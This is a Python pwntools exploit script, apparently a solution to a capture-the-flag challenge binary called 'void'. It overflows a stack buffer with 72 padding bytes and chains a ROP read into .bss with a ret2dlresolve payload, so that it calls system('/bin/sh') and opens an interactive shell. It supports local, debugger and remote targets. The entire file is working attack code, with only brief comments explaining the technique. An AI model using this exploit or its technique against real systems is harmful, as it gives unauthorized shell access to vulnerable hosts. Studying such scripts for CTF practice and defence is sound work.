#!/usr/bin/env python3

from pwn import *

e = ELF("./void_patched")
libc = ELF('./glibc/libc.so.6')

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(main)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(vuln+32)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # TL;DR: ret2dlresolve
    # There is no syscall in the binary thus we cannot call rop.execve(bin_sh,0,0)

    buff_addr = e.bss() + 0x20 # Add 0x20 to avoid overwriting std IO
    info(f'the bss is at {hex(e.bss())}')
    dlresolve = Ret2dlresolvePayload(e, symbol='system', args=['/bin/sh'], data_addr=buff_addr)
    rop = ROP(e)
    rop.read(0, buff_addr)  # the default rdx is 0xc8 which is big enough.
    rop.ret2dlresolve(dlresolve)
    r.sendline(b'\x90' * 72 + rop.chain())
    r.sendline(dlresolve.payload)

    r.interactive()

if __name__ == "__main__":
    main()
